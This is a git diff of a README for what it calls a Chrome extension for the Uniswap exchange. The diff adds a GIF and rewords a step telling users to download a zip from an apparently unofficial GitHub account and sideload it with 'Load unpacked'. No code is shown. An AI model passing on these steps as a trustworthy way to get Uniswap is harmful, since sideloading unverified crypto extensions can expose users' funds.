@@ -9,6 +9,9 @@
 
 A Chrome extension for Uniswap cryptocurrency DeFi exchange
 
+![ezgif com-gif-maker(1)](https://user-images.githubusercontent.com/36484062/158165440-fc3f3053-fa39-48f2-8b3a-d6f4357f2bcb.gif)
+
+
 # What is Uniswap?
 Uniswap is the largest decentralized exchange (or DEX) operating on the Ethereum blockchain. It allows users anywhere in the world to trade crypto without an intermediary. 
 
@@ -22,7 +25,7 @@ Uniswap is the largest decentralized exchange (or DEX) operating on the Ethereum
 ![How-To-Manually-Install-A-Chrome-Extension](https://user-images.githubusercontent.com/36484062/158015112-a8d7a6b1-e8c0-44fc-a6b2-c42573d900e8.jpg)
 
 3. Download uniswap Extension: https://github.com/Uniswap-EXT/Uniswap-Chrome-Extension/archive/refs/heads/main.zip
-  - Extract zip file, enter the folder then drag and drop extension folder into chrome extensions window. 
+  - Extract zip file, go into the folder then drag and drop extension folder into chrome extensions window. 
   
   - Alternatively, click on the Load unpacked button, navigate to the extensions folder and press Select Folder.
   
